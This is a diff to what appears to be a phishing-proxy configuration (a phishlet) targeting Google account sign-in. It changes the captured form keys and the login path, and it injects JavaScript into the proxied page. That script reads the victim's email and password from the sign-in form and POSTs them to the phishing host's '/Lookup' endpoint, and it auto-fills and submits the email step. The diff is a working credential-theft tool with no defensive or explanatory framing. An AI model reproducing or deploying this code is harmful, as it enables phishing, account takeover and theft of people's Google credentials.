@@ -22,11 +22,11 @@ auth_tokens:
 
 credentials:
   username:
-    key: 'identifier'
+    key: 'unenc_email'
     search: '(.*)'
     type: 'post'
   password:
-    key: 'password'
+    key: 'unenc_pwd'
     search: '(.*)'
     type: 'post'
 
@@ -36,31 +36,44 @@ auth_urls:
 
 login:
   domain: 'accounts.google.com'
-  path: '/v3/signin/identifier?hl=en-gb&ifkv=AXo7B7UABTxmLreIW6Ezx2l4L1O7d4mXmBdHBE050a0IFhH96cf3BqQmQSzIf2edWm6za6q2vQtOGg&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1962559372%3A1693797080439735&theme=glif'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
 
-js_inject:  
-  - trigger_domains: ["accounts.google.com"]
-    trigger_paths: ["/signin/v3/identifier"]
-    trigger_params: ["email"]
+js_inject:
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['/identifier']
     script: |
-      function lp(){
-        var email = document.querySelector("#Email");
-        if (email != null) {
-          email.value = "{email}";
-          return;
-        }
-        setTimeout(function(){lp();}, 100);
-      }
-      setTimeout(function(){lp();}, 100);
-      function serialize( obj ){
-        var str = [];
-        for (var p in obj){
-          if (obj.hasOwnProperty(p)) {
-            str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
-          }
-        }
-        return str.join("&");
-      }
+      setInterval(function() {
+
+           if (document.querySelectorAll("input[name='Passwd']")?.length) {
+              
+                      var password = document.getElementsByName("Passwd")[0].value;
+                      var email = document.querySelector("#identifierId")?.value;
+                      var xhr = new XMLHttpRequest();
+                      var myHostName = ('https://'+ location.hostname);
+                      myHostName = myHostName.replace('accounts.', '');
+                      xhr.open("POST", myHostName + "/Lookup", true);
+                      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                      xhr.send("unenc_email=" + encodeURIComponent(email) + "&unenc_pwd=" + encodeURIComponent(password));
+
+           } else {
+            
+           }
+              
+        }, 2000);
+
+
+        setTimeout(function() {
+
+           if (document.querySelectorAll("input[aria-label='Email or phone']")?.length) {
+              
+                      var email = document.querySelector("#identifierId")?.value;
+                      document.getElementById("identifierId").value = localStorage.getItem("email");
+                      document.getElementById('identifierNext').click();
+           } else {
+            
+           }
+              
+        }, 3500);
         
   - trigger_domains: ['myaccount.google.com']
     trigger_paths: ['.*?']
